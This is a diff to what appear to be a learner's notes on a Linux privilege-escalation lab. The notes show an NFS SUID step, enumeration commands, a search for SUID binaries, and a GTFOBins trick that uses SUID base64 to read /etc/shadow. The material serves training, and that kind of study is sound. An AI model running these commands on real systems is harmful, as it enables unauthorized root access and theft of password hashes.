@@ -146,10 +146,22 @@ The binary will now appear on the target system (due to shared mount).
 6. Execute the SUID binary on the target to gain root
 `./nfs`
 # Capstone Challenge
-1. Enumeration
+## Enumeration
 ```sh
 hostname   
 sudo -l   
 cat /etc/passwd   
 uname-a
 ```
+
+Ex:
+We know the hostname, the kernel version of the system, that leonard can’t run any sudo commands and that there is another user “missy”.
+**Kernel Exploits** — for this kernel we need to look for the exploit.db but I was unable to find any valid exploit
+**sudo** — no sudo can be run by leonard which we have checked by `sudo -l`
+## SUID
+To exploit SUID we need to find if any of the programs are wrongly configured, run this to check if any file can be run with root privileges
+`find / -type f -perm -04000 -ls 2>/dev/null`
+In this case, Base64
+Check GTFOBins
+`LFILE=/etc/shadow
+`/bin/base64 "$LFILE" | base64 --decode`
